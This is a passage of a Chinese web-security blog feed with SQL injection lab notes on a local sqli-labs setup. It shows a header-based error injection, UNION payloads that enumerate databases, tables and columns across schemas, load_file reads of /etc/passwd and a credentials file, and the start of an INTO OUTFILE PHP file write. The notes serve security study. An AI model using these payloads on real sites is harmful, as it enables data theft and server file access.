<span class="token variable">$uname</span>)"</span><span class="token punctuation">;</span>                        mysql_query<span class="token punctuation">(</span><span class="token variable">$insert</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        //echo <span class="token string">'Your IP ADDRESS is: '</span> <span class="token keyword">.</span><span class="token variable">$IP</span><span class="token punctuation">;</span>                        <span class="token keyword">echo</span> <span class="token string">"&lt;/font>"</span><span class="token punctuation">;</span>                        //echo <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>                        <span class="token keyword">echo</span> <span class="token string">'&lt;font color= "#0000ff" font size = 3 >'</span><span class="token punctuation">;</span>                        <span class="token keyword">echo</span> <span class="token string">'Your User Agent is: '</span> <span class="token keyword">.</span><span class="token variable">$uagent</span><span class="token punctuation">;</span>                        <span class="token keyword">echo</span> <span class="token string">"&lt;/font>"</span><span class="token punctuation">;</span>                        <span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>                        print_r<span class="token punctuation">(</span>mysql_error<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">;</span>                        <span class="token keyword">echo</span> <span class="token string">"&lt;br>&lt;br>"</span><span class="token punctuation">;</span>                        <span class="token keyword">echo</span> <span class="token string">'&lt;img src="../images/flag.jpg"  />'</span><span class="token punctuation">;</span>                        <span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>                        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>                <span class="token keyword">else</span>                        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>                        <span class="token keyword">echo</span> <span class="token string">'&lt;font color= "#0000ff" font size="3">'</span><span class="token punctuation">;</span>                        //echo <span class="token string">"Try again looser"</span><span class="token punctuation">;</span>                        print_r<span class="token punctuation">(</span>mysql_error<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">;</span>                        <span class="token keyword">echo</span> <span class="token string">"&lt;/br>"</span><span class="token punctuation">;</span>                        <span class="token keyword">echo</span> <span class="token string">"&lt;/br>"</span><span class="token punctuation">;</span>                        <span class="token keyword">echo</span> <span class="token string">'&lt;img src="../images/slap.jpg"   />'</span><span class="token punctuation">;</span>                        <span class="token keyword">echo</span> <span class="token string">"&lt;/font>"</span><span class="token punctuation">;</span>                        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span></code></pre><p>从上面的SQL语句当中我们可以看到对执行的insert语句没有任何的限制也就是说我们通过修改http的头部信息可以达到SQL注入的效果。</p><p>为了实验方便我在第103行下面添加一行显示SQL语句执行的显示界面echo $insert;</p><pre class=" language-bash"><code class="language-bash">root@eafc9e16990f:/var/www/html/Less-18<span class="token comment" spellcheck="true"># tail -36 index.php |head -2</span>                        <span class="token variable">$insert</span><span class="token operator">=</span><span class="token string">"INSERT INTO <span class="token variable"><span class="token variable">`</span>security<span class="token variable">`</span></span>.<span class="token variable"><span class="token variable">`</span>uagents<span class="token variable">`</span></span> (<span class="token variable"><span class="token variable">`</span>uagent<span class="token variable">`</span></span>, <span class="token variable"><span class="token variable">`</span>ip_address<span class="token variable">`</span></span>, <span class="token variable"><span class="token variable">`</span>username<span class="token variable">`</span></span>) VALUES ('<span class="token variable">$uagent</span>', '<span class="token variable">$IP</span>', <span class="token variable">$uname</span>)"</span><span class="token punctuation">;</span>                        <span class="token keyword">echo</span> <span class="token variable">$insert</span><span class="token punctuation">;</span>root@eafc9e16990f:/var/www/html/Less-18<span class="token comment" spellcheck="true">#</span></code></pre><p><img src="/2023/09/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-014/27.png"></p><p>修改数据包注入获取数据库名称’and extractvalue (1,concat(0x7e,(select database()),0x7e)) and’<br><img src="/2023/09/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-014/28.png"></p><p>获取用户名<br><img src="/2023/09/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-014/29.png"></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志-013</title>
      <link href="/2023/09/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-013/"/>
      <url>/2023/09/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-013/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB漏洞-SQL-注入-二"><a href="#WEB漏洞-SQL-注入-二" class="headerlink" title="WEB漏洞-SQL 注入(二)"></a><font size="6"><strong>WEB漏洞-SQL 注入(二)</strong></font></h2><span id="more"></span><p><img src="/2023/09/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-013/1.png"></p><h3 id="一、information-schema"><a href="#一、information-schema" class="headerlink" title="一、information_schema"></a><font size="5"><strong>一、information_schema</strong></font></h3><p>information_schema 数据库跟 performance_schema 一样，都是 MySQL 自带的信息数据库。其中 performance_schema 用于性能分析，而 information_schema 用于存储数据库元数据(关于数据的数据)，例如数据库名、表名、列的数据类型、访问权限等。<br>information_schema 中的表实际上是视图，而不是基本表，因此，文件系统上没有与之相关的文件。</p><h4 id="●-SCHEMATA表"><a href="#●-SCHEMATA表" class="headerlink" title="● SCHEMATA表"></a><font size="4"><strong>● SCHEMATA表</strong></font></h4><p>当前 mysql 实例中所有数据库的信息。SHOW DATABASES; 命令从这个表获取数据</p><p>获取到数据库名称</p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> use information_schema<span class="token punctuation">;</span>mysql<span class="token operator">></span> <span class="token keyword">select</span> SCHEMA_NAME,DEFAULT_CHARACTER_SET_NAME from SCHEMATA<span class="token punctuation">;</span>+--------------------+----------------------------+<span class="token operator">|</span> SCHEMA_NAME        <span class="token operator">|</span> DEFAULT_CHARACTER_SET_NAME <span class="token operator">|</span>+--------------------+----------------------------+<span class="token operator">|</span> information_schema <span class="token operator">|</span> utf8                       <span class="token operator">|</span><span class="token operator">|</span> challenges         <span class="token operator">|</span> gbk                        <span class="token operator">|</span><span class="token operator">|</span> mysql              <span class="token operator">|</span> latin1                     <span class="token operator">|</span><span class="token operator">|</span> performance_schema <span class="token operator">|</span> utf8                       <span class="token operator">|</span><span class="token operator">|</span> security           <span class="token operator">|</span> gbk                        <span class="token operator">|</span>+--------------------+----------------------------+</code></pre><h4 id="●-TABLES-表"><a href="#●-TABLES-表" class="headerlink" title="● TABLES 表"></a><font size="4"><strong>● TABLES 表</strong></font></h4><p>存储数据库中的表信息（包括视图），包括表属于哪个数据库，表的类型、存储引擎、创建时间等信息。SHOW TABLES FROM XX; 命令从这个表获取结果。</p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME from tables limit 0,5<span class="token punctuation">;</span>+---------------+--------------------+---------------------------------------+<span class="token operator">|</span> TABLE_CATALOG <span class="token operator">|</span> TABLE_SCHEMA       <span class="token operator">|</span> TABLE_NAME                            <span class="token operator">|</span>+---------------+--------------------+---------------------------------------+<span class="token operator">|</span> def           <span class="token operator">|</span> information_schema <span class="token operator">|</span> CHARACTER_SETS                        <span class="token operator">|</span><span class="token operator">|</span> def           <span class="token operator">|</span> information_schema <span class="token operator">|</span> COLLATIONS                            <span class="token operator">|</span><span class="token operator">|</span> def           <span class="token operator">|</span> information_schema <span class="token operator">|</span> COLLATION_CHARACTER_SET_APPLICABILITY <span class="token operator">|</span><span class="token operator">|</span> def           <span class="token operator">|</span> information_schema <span class="token operator">|</span> COLUMNS                               <span class="token operator">|</span><span class="token operator">|</span> def           <span class="token operator">|</span> information_schema <span class="token operator">|</span> COLUMN_PRIVILEGES                     <span class="token operator">|</span>+---------------+--------------------+---------------------------------------+5 rows <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span></code></pre><h4 id="●-COLUMNS-表"><a href="#●-COLUMNS-表" class="headerlink" title="● COLUMNS 表"></a><font size="4"><strong>● COLUMNS 表</strong></font></h4><p>存储表中的列信息，包括表有多少列、每个列的类型等。SHOW COLUMNS FROM schemaname.tablename 命令从这个表获取结果。</p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> SELECT TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME FROM COLUMNS LIMIT 2,5<span class="token punctuation">;</span>+---------------+--------------------+----------------+<span class="token operator">|</span> TABLE_CATALOG <span class="token operator">|</span> TABLE_SCHEMA       <span class="token operator">|</span> TABLE_NAME     <span class="token operator">|</span>+---------------+--------------------+----------------+<span class="token operator">|</span> def           <span class="token operator">|</span> information_schema <span class="token operator">|</span> CHARACTER_SETS <span class="token operator">|</span><span class="token operator">|</span> def           <span class="token operator">|</span> information_schema <span class="token operator">|</span> CHARACTER_SETS <span class="token operator">|</span><span class="token operator">|</span> def           <span class="token operator">|</span> information_schema <span class="token operator">|</span> COLLATIONS     <span class="token operator">|</span><span class="token operator">|</span> def           <span class="token operator">|</span> information_schema <span class="token operator">|</span> COLLATIONS     <span class="token operator">|</span><span class="token operator">|</span> def           <span class="token operator">|</span> information_schema <span class="token operator">|</span> COLLATIONS     <span class="token operator">|</span>+---------------+--------------------+----------------+</code></pre><h4 id="●-USER-PRIVILEGES-表"><a href="#●-USER-PRIVILEGES-表" class="headerlink" title="● USER_PRIVILEGES 表"></a><font size="4"><strong>● USER_PRIVILEGES 表</strong></font></h4><p>用户权限表。内容源自 mysql.user 授权表。是非标准表。</p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> SELECT * FROM USER_PRIVILEGES limit 0,5<span class="token punctuation">;</span>+--------------------+---------------+----------------+--------------+<span class="token operator">|</span> GRANTEE            <span class="token operator">|</span> TABLE_CATALOG <span class="token operator">|</span> PRIVILEGE_TYPE <span class="token operator">|</span> IS_GRANTABLE <span class="token operator">|</span>+--------------------+---------------+----------------+--------------+<span class="token operator">|</span> <span class="token string">'root'</span>@<span class="token string">'localhost'</span> <span class="token operator">|</span> def           <span class="token operator">|</span> SELECT         <span class="token operator">|</span> YES          <span class="token operator">|</span><span class="token operator">|</span> <span class="token string">'root'</span>@<span class="token string">'localhost'</span> <span class="token operator">|</span> def           <span class="token operator">|</span> INSERT         <span class="token operator">|</span> YES          <span class="token operator">|</span><span class="token operator">|</span> <span class="token string">'root'</span>@<span class="token string">'localhost'</span> <span class="token operator">|</span> def           <span class="token operator">|</span> UPDATE         <span class="token operator">|</span> YES          <span class="token operator">|</span><span class="token operator">|</span> <span class="token string">'root'</span>@<span class="token string">'localhost'</span> <span class="token operator">|</span> def           <span class="token operator">|</span> DELETE         <span class="token operator">|</span> YES          <span class="token operator">|</span><span class="token operator">|</span> <span class="token string">'root'</span>@<span class="token string">'localhost'</span> <span class="token operator">|</span> def           <span class="token operator">|</span> CREATE         <span class="token operator">|</span> YES          <span class="token operator">|</span>+--------------------+---------------+----------------+--------------+5 rows <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span></code></pre><h3 id="二、跨库攻击"><a href="#二、跨库攻击" class="headerlink" title="二、跨库攻击"></a><font size="5"><strong>二、跨库攻击</strong></font></h3><p><strong>前提准备</strong></p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> create database book<span class="token punctuation">;</span>mysql<span class="token operator">></span> use book<span class="token punctuation">;</span>mysql<span class="token operator">></span> CREATE TABLE IF NOT EXISTS book<span class="token punctuation">(</span>    <span class="token variable"><span class="token variable">`</span>book_id<span class="token variable">`</span></span> INT UNSIGNED AUTO_INCREMENT,    <span class="token variable"><span class="token variable">`</span>book_title<span class="token variable">`</span></span> VARCHAR<span class="token punctuation">(</span>100<span class="token punctuation">)</span> NOT NULL,    <span class="token variable"><span class="token variable">`</span>book_author<span class="token variable">`</span></span> VARCHAR<span class="token punctuation">(</span>40<span class="token punctuation">)</span> NOT NULL,    <span class="token variable"><span class="token variable">`</span>submission_date<span class="token variable">`</span></span> DATE,    PRIMARY KEY <span class="token punctuation">(</span> <span class="token variable"><span class="token variable">`</span>book_id<span class="token variable">`</span></span> <span class="token punctuation">)</span> <span class="token punctuation">)</span>ENGINE<span class="token operator">=</span>InnoDB DEFAULT CHARSET<span class="token operator">=</span>utf8<span class="token punctuation">;</span>mysql<span class="token operator">></span> show databases<span class="token punctuation">;</span>+--------------------+<span class="token operator">|</span> Database           <span class="token operator">|</span>+--------------------+<span class="token operator">|</span> information_schema <span class="token operator">|</span><span class="token operator">|</span> book               <span class="token operator">|</span><span class="token operator">|</span> mysql              <span class="token operator">|</span><span class="token operator">|</span> performance_schema <span class="token operator">|</span>+--------------------+mysql<span class="token operator">></span> use book<span class="token punctuation">;</span>mysql<span class="token operator">></span> show tables<span class="token punctuation">;</span>+----------------+<span class="token operator">|</span> Tables_in_book <span class="token operator">|</span>+----------------+<span class="token operator">|</span> book           <span class="token operator">|</span>+----------------+1 row <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>mysql<span class="token operator">></span> desc book<span class="token punctuation">;</span>+-----------------+------------------+------+-----+---------+----------------+<span class="token operator">|</span> Field           <span class="token operator">|</span> Type             <span class="token operator">|</span> Null <span class="token operator">|</span> Key <span class="token operator">|</span> Default <span class="token operator">|</span> Extra          <span class="token operator">|</span>+-----------------+------------------+------+-----+---------+----------------+<span class="token operator">|</span> book_id         <span class="token operator">|</span> int<span class="token punctuation">(</span>10<span class="token punctuation">)</span> unsigned <span class="token operator">|</span> NO   <span class="token operator">|</span> PRI <span class="token operator">|</span> NULL    <span class="token operator">|</span> auto_increment <span class="token operator">|</span><span class="token operator">|</span> book_title      <span class="token operator">|</span> varchar<span class="token punctuation">(</span>100<span class="token punctuation">)</span>     <span class="token operator">|</span> NO   <span class="token operator">|</span>     <span class="token operator">|</span> NULL    <span class="token operator">|</span>                <span class="token operator">|</span><span class="token operator">|</span> book_author     <span class="token operator">|</span> varchar<span class="token punctuation">(</span>40<span class="token punctuation">)</span>      <span class="token operator">|</span> NO   <span class="token operator">|</span>     <span class="token operator">|</span> NULL    <span class="token operator">|</span>                <span class="token operator">|</span><span class="token operator">|</span> submission_date <span class="token operator">|</span> <span class="token function">date</span>             <span class="token operator">|</span> YES  <span class="token operator">|</span>     <span class="token operator">|</span> NULL    <span class="token operator">|</span>                <span class="token operator">|</span>+-----------------+------------------+------+-----+---------+----------------+4 rows <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span></code></pre><p>打开网页进行查询当前数据库的用户<br>?id&#x3D;-1%20union%20select%201,user(),3<br><img src="/2023/09/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-013/2.png"></p><p>可以看到当前用户为root拥有最高的权限。</p><p>获取到当前网页的数据库名?id&#x3D;-1%20union%20select%201,database(),3<br><img src="/2023/09/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-013/3.png"></p><p>获取到当前网站的数据库是security</p><h4 id="●-常见的数据库与用户的对应关系"><a href="#●-常见的数据库与用户的对应关系" class="headerlink" title="● 常见的数据库与用户的对应关系"></a><font size="4"><strong>● 常见的数据库与用户的对应关系</strong></font></h4><pre class=" language-bash"><code class="language-bash">数据库A<span class="token operator">=</span>网站A<span class="token operator">=</span>数据库用户A——<span class="token operator">></span>表名——<span class="token operator">></span>列名——<span class="token operator">></span>数据数据库B<span class="token operator">=</span>网站B<span class="token operator">=</span>数据库用户B——<span class="token operator">></span>表名——<span class="token operator">></span>列名——<span class="token operator">></span>数据数据库C<span class="token operator">=</span>网站C<span class="token operator">=</span>数据库用户C——<span class="token operator">></span>表名——<span class="token operator">></span>列名——<span class="token operator">></span>数据</code></pre><p><strong>备注：</strong>这样的好处一个用户对应一个库、这样网站之间的数据互不干扰，当然这是最基础的数据库模型，现在大网站都是分布式数据库。</p><h4 id="●-在数据库中查询有哪些用户"><a href="#●-在数据库中查询有哪些用户" class="headerlink" title="● 在数据库中查询有哪些用户"></a><font size="4"><strong>● 在数据库中查询有哪些用户</strong></font></h4><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> use mysql<span class="token punctuation">;</span>Database changedmysql<span class="token operator">></span> <span class="token keyword">select</span> host,user,password from user<span class="token punctuation">;</span>+--------------+------+----------+<span class="token operator">|</span> host         <span class="token operator">|</span> user <span class="token operator">|</span> password <span class="token operator">|</span>+--------------+------+----------+<span class="token operator">|</span> localhost    <span class="token operator">|</span> root <span class="token operator">|</span>          <span class="token operator">|</span><span class="token operator">|</span> 2c8a2316583a <span class="token operator">|</span> root <span class="token operator">|</span>          <span class="token operator">|</span><span class="token operator">|</span> 127.0.0.1    <span class="token operator">|</span> root <span class="token operator">|</span>          <span class="token operator">|</span><span class="token operator">|</span> ::1          <span class="token operator">|</span> root <span class="token operator">|</span>          <span class="token operator">|</span>+--------------+------+----------+4 rows <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>mysql<span class="token operator">></span></code></pre><h4 id="●-在源码中查看使用的是哪一个用户"><a href="#●-在源码中查看使用的是哪一个用户" class="headerlink" title="● 在源码中查看使用的是哪一个用户"></a><font size="4"><strong>● 在源码中查看使用的是哪一个用户</strong></font></h4><pre class=" language-bash"><code class="language-bash">root@2c8a2316583a:/var/www/html<span class="token comment" spellcheck="true"># cat sql-connections/db-creds.inc</span><span class="token operator">&lt;</span>?php//give your mysql connection username n password<span class="token variable">$dbuser</span> <span class="token operator">=</span><span class="token string">'root'</span><span class="token punctuation">;</span><span class="token variable">$dbpass</span> <span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span><span class="token variable">$dbname</span> <span class="token operator">=</span><span class="token string">"security"</span><span class="token punctuation">;</span><span class="token variable">$host</span> <span class="token operator">=</span> <span class="token string">'localhost'</span><span class="token punctuation">;</span><span class="token variable">$dbname1</span> <span class="token operator">=</span> <span class="token string">"challenges"</span><span class="token punctuation">;</span>?<span class="token operator">></span></code></pre><p>一般在网站安装的时候会指定数据库的用户名和密码这里指定的是root用户密码为空指定的数据库是security</p><p> 跨库查询的前提条件是必须<font color=" red"><strong>高权限</strong></font>的用户才能执行跨库查询。<br>?id&#x3D;-1%20union%20select%201,schema_name,3%20from%20information_schema.schemata<br><img src="/2023/09/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-013/4.png"></p><h4 id="●-数据库中执行"><a href="#●-数据库中执行" class="headerlink" title="● 数据库中执行"></a><font size="4"><strong>● 数据库中执行</strong></font></h4><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> SELECT * FROM <span class="token function">users</span> WHERE id<span class="token operator">=</span>-1 union <span class="token keyword">select</span> 1,schema_name,3 from information_schema.schemata LIMIT 0,1<span class="token punctuation">;</span>+----+--------------------+----------+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username           <span class="token operator">|</span> password <span class="token operator">|</span>+----+--------------------+----------+<span class="token operator">|</span>  1 <span class="token operator">|</span> information_schema <span class="token operator">|</span> 3        <span class="token operator">|</span>+----+--------------------+----------+1 row <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>mysql<span class="token operator">></span></code></pre><h4 id="●-1、获取到所有的数据库名称"><a href="#●-1、获取到所有的数据库名称" class="headerlink" title="● 1、获取到所有的数据库名称"></a><font size="4"><strong>● 1、获取到所有的数据库名称</strong></font></h4><p>union select 1,group_concat(schema_name),3 from information_schema.schemata<br>备注：GROUP_CONCAT函数将分组中的字符串与各种选项进行连接。<br><img src="/2023/09/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-013/5.png"><br>等同于在数据库中执行以下命令</p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> use security<span class="token punctuation">;</span>Reading table information <span class="token keyword">for</span> completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql<span class="token operator">></span> SELECT * FROM <span class="token function">users</span> WHERE id<span class="token operator">=</span>-1 union <span class="token keyword">select</span> 1,group_concat<span class="token punctuation">(</span>schema_name<span class="token punctuation">)</span>,3 from information_schema.schemata  LIMIT 0,1<span class="token punctuation">;</span>+----+----------------------------------------------------------------------+----------+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username                                                             <span class="token operator">|</span> password <span class="token operator">|</span>+----+----------------------------------------------------------------------+----------+<span class="token operator">|</span>  1 <span class="token operator">|</span> information_schema,book,challenges,mysql,performance_schema,security <span class="token operator">|</span> 3        <span class="token operator">|</span>+----+----------------------------------------------------------------------+----------+1 row <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>mysql<span class="token operator">></span></code></pre><h4 id="●-2、指定获取book库中的表名信息"><a href="#●-2、指定获取book库中的表名信息" class="headerlink" title="● 2、指定获取book库中的表名信息"></a><font size="4"><strong>● 2、指定获取book库中的表名信息</strong></font></h4><p><img src="/2023/09/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-013/6.png"><br>union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;’book’</p><p>等同于在数据库中执行以下命令</p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> SELECT * FROM <span class="token function">users</span> WHERE id<span class="token operator">=</span>-1 union <span class="token keyword">select</span> 1,group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span>,3 from information_schema.tables where table_schema<span class="token operator">=</span><span class="token string">'book'</span>  LIMIT 0,1<span class="token punctuation">;</span>+----+----------+----------+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username <span class="token operator">|</span> password <span class="token operator">|</span>+----+----------+----------+<span class="token operator">|</span>  1 <span class="token operator">|</span> book     <span class="token operator">|</span> 3        <span class="token operator">|</span>+----+----------+----------+1 row <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>mysql<span class="token operator">></span></code></pre><h4 id="●-3、获取指定数据库book下的book表的列名信息"><a href="#●-3、获取指定数据库book下的book表的列名信息" class="headerlink" title="● 3、获取指定数据库book下的book表的列名信息"></a><font size="4"><strong>● 3、获取指定数据库book下的book表的列名信息</strong></font></h4><p><img src="/2023/09/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-013/7.png"><br>union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;’book’ and table_schema&#x3D;’book’<br>等同于以下的数据库命</p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> use security<span class="token punctuation">;</span>Reading table information <span class="token keyword">for</span> completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql<span class="token operator">></span> SELECT * FROM <span class="token function">users</span> WHERE id<span class="token operator">=</span>-1 union <span class="token keyword">select</span> 1,group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span>,3 from information_schema.columns where table_name<span class="token operator">=</span><span class="token string">'book'</span> and table_schema<span class="token operator">=</span><span class="token string">'book'</span>  LIMIT 0,1<span class="token punctuation">;</span>+----+------------------------------------------------+----------+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username                                       <span class="token operator">|</span> password <span class="token operator">|</span>+----+------------------------------------------------+----------+<span class="token operator">|</span>  1 <span class="token operator">|</span> book_id,book_title,book_author,submission_date <span class="token operator">|</span> 3        <span class="token operator">|</span>+----+------------------------------------------------+----------+1 row <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>mysql<span class="token operator">></span></code></pre><h4 id="●-4、查询到指定数据"><a href="#●-4、查询到指定数据" class="headerlink" title="● 4、查询到指定数据"></a><font size="4"><strong>● 4、查询到指定数据</strong></font></h4><p><img src="/2023/09/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-013/8.png"></p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> SELECT * FROM <span class="token function">users</span> WHERE id<span class="token operator">=</span>-1 union  <span class="token keyword">select</span> book_id,book_title,book_author from book.book  LIMIT 0,1<span class="token punctuation">;</span>+----+----------+----------+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username <span class="token operator">|</span> password <span class="token operator">|</span>+----+----------+----------+<span class="token operator">|</span>  1 <span class="token operator">|</span> Linux    <span class="token operator">|</span> oldjiang <span class="token operator">|</span>+----+----------+----------+1 row <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>mysql<span class="token operator">></span></code></pre><p>备注：username和password字段是users表中的字段，又因为查询到的数据为空执行后面的联合字句的时候将内容填充到下面所以获取到的内容并不是十分准确，另外要内容十分准确必须要满足book表和user表的结构完全相同</p><h3 id="三、文件读写函数"><a href="#三、文件读写函数" class="headerlink" title="三、文件读写函数"></a><font size="5"><strong>三、文件读写函数</strong></font></h3><p>参考地址：<a href="https://www.sqlsec.com/2020/11/mysql.html">https://www.sqlsec.com/2020/11/mysql.html</a><br>load_file文件读取<br>into outfile 或into dumpfile文件写入</p><p>查询是否有写入的权限</p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> show global variables like <span class="token string">'%secure_file_priv%'</span><span class="token punctuation">;</span>+------------------+-------+<span class="token operator">|</span> Variable_name    <span class="token operator">|</span> Value <span class="token operator">|</span>+------------------+-------+<span class="token operator">|</span> secure_file_priv <span class="token operator">|</span>       <span class="token operator">|</span>+------------------+-------+</code></pre><table>    <thead>        <tr>            <th>Value</th>            <th>说明</th>        </tr>    </thead>    <tbody>        <tr>            <td>NULL</td>            <td>不允许导入或导出</td>        </tr>        <tr>            <td>/tmp</td>            <td>只允许在 /tmp 目录导入导出</td>        </tr>        <tr>            <td>空</td>            <td>不限制目录</td>        </tr>    </tbody></table><p><font color=" red"><strong>在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件<br>在 MySQL 5.5之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件</strong></font></p><h4 id="●-文件读取"><a href="#●-文件读取" class="headerlink" title="● 文件读取"></a><font size="4"><strong>● 文件读取</strong></font></h4><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> load_file<span class="token punctuation">(</span><span class="token string">'/etc/passwd'</span><span class="token punctuation">)</span>\G<span class="token punctuation">;</span>*************************** 1. row ***************************load_file<span class="token punctuation">(</span><span class="token string">'/etc/passwd'</span><span class="token punctuation">)</span>: root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System <span class="token punctuation">(</span>admin<span class="token punctuation">)</span>:/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinlibuuid:x:100:101::/var/lib/libuuid:syslog:x:101:104::/home/syslog:/bin/falsemysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false1 row <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>ERROR:No query specifiedmysql<span class="token operator">></span></code></pre><p>读取敏感信息：<a href="https://blog.csdn.net/weixin_30292843/article/details/99381669">https://blog.csdn.net/weixin_30292843/article/details/99381669</a><br>在网站上面读取内容:?id&#x3D;-2%20union%20select%201,load_file(%27&#x2F;etc&#x2F;passwd%27),3<br><img src="/2023/09/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-013/9.png"></p><p>读取数据库的配置信息<br>?id&#x3D;-1%20union%20select%201,load_file(%27&#x2F;var&#x2F;www&#x2F;html&#x2F;sql-connections&#x2F;db-creds.inc%27),3<br><img src="/2023/09/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-013/10.png"></p><p>右击查看源代码<br><img src="/2023/09/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-013/11.png"></p><h4 id="●-文件写入"><a href="#●-文件写入" class="headerlink" title="● 文件写入"></a><font size="4"><strong>● 文件写入</strong></font></h4><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token string">'&lt;?php phpinfo() ?>'</span> into outfile <span class="token string">'./php'</span><span class="token punctuation">;</span>Query OK, 1 row affected <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>mysql<span class="token operator">></span>root@06026a1599f9:/<span class="token comment" spellcheck="true"># cat /var/lib/mysql/php</span><span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span> ?<span class="token operator">></span>mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token string">'&lt;?php phpinfo() ?>'</span> into 